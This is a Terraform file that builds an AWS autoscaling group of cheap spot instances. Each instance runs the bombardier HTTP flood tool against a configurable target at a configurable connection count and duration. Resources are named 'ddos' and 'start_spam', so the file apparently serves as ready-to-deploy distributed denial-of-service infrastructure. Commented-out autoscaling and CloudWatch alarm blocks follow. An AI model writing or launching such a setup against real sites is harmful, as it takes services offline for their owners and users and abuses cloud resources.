data "cloudinit_config" "start_spam" {

  base64_encode = true
  gzip          = false
  boundary      = "//"

  part {
    content_type = "text/x-shellscript"
    content = "sudo yum update -y\nsudo yum install docker -y\nsudo systemctl unmask docker.service\nsudo systemctl unmask docker.socket\nsudo systemctl start docker.service\nsudo systemctl start docker\nsudo docker run alpine/bombardier -c ${var.connections} -d ${var.live_seconds}s -l ${var.target}"
  }
}


resource "aws_launch_template" "ddos" {
  name_prefix   =  var.name_prefix
  image_id      =  var.ami
  instance_type = "t3.nano"
  user_data = "${data.cloudinit_config.start_spam.rendered}"
  key_name  = var.key_name
  vpc_security_group_ids = var.vpc_security_group_ids


  instance_market_options {
    market_type = "spot"
  }
}

resource "aws_autoscaling_group" "bombardier" {
  desired_capacity    = var.desired_capacity
  max_size            = var.max_size
  min_size            = var.min_size
  vpc_zone_identifier = var.aws_subnets
  force_delete        = var.force_delete

  launch_template {
    id      = aws_launch_template.ddos.id
    version = "$Latest"
  }
}

# resource "aws_autoscaling_policy" "bombardier" {
#   name                   = "bombardier-asg-policy"
#   scaling_adjustment     = 4
#   adjustment_type        = "ChangeInCapacity"
#   cooldown               = 30
#   autoscaling_group_name = aws_autoscaling_group.bombardier.name

#   target_tracking_configuration {
#     predefined_metric_specification {
#       predefined_metric_type = "ASGAverageCPUUtilization"
#     }

#     target_value = var.target_value
#   }
# }

#------------------------------------------------------------------------------
# AUTOSCALING POLICIES
#------------------------------------------------------------------------------
# Scaling UP - CPU High
# resource "aws_autoscaling_policy" "cpu_high" {
#   name                   = "${var.name_prefix}-cpu-high"
#   autoscaling_group_name = aws_autoscaling_group.bombardier.name
#   adjustment_type        = "ChangeInCapacity"
#   policy_type            = "SimpleScaling"
#   scaling_adjustment     = "1"
#   cooldown               = "30"
# }
# # Scaling DOWN - CPU Low
# resource "aws_autoscaling_policy" "cpu_low" {
#   name                   = "${var.name_prefix}-cpu-low"
#   autoscaling_group_name = aws_autoscaling_group.bombardier.name
#   adjustment_type        = "ChangeInCapacity"
#   policy_type            = "SimpleScaling"
#   scaling_adjustment     = "-1"
#   cooldown               = "30"
# }

#------------------------------------------------------------------------------
# CLOUDWATCH METRIC ALARMS
#------------------------------------------------------------------------------
# resource "aws_cloudwatch_metric_alarm" "cpu_high_alarm" {
#   alarm_name          = "${var.name_prefix}-cpu-high-alarm"
#   comparison_operator = "GreaterThanOrEqualToThreshold"
#   evaluation_periods  = "2"
#   metric_name         = "CPUUtilization"
#   namespace           = "AWS/EC2"
#   period              = "60"
#   statistic           = "Average"
#   threshold           = "80"
#   actions_enabled     = true
#   alarm_actions       = ["${aws_autoscaling_policy.cpu_high.arn}"]
#   dimensions = {
#     "AutoScalingGroupName" = "${aws_autoscaling_group.bombardier.name}"
#   }
# }

# resource "aws_cloudwatch_metric_alarm" "cpu_low_alarm" {
#   alarm_name          = "${var.name_prefix}-cpu-low-alarm"
#   comparison_operator = "LessThanOrEqualToThreshold"
#   evaluation_periods  = "2"
#   metric_name         = "CPUUtilization"
#   namespace           = "AWS/EC2"
#   period              = "60"
#   statistic           = "Average"
#   threshold           = var.scale_down_threshold
#   actions_enabled     = true
#   alarm_actions       = ["${aws_autoscaling_policy.cpu_low.arn}"]
#   dimensions = {
#     "AutoScalingGroupName" = "${aws_autoscaling_group.bombardier.name}"
#   }
# }